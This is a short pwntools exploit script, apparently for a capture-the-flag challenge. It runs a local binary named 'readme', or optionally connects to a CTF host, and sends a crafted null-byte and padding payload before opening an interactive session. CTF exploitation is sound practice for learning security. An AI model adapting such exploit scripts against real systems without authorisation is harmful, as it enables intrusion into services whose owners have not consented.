from pwn import *
elf = context.binary = ELF('./readme')
io = process()
#io = remote("challs.0x4m4.com", 32791)
io.sendline(b'\x00' + b'A'* 5 + b'\x00')
io.interactive()
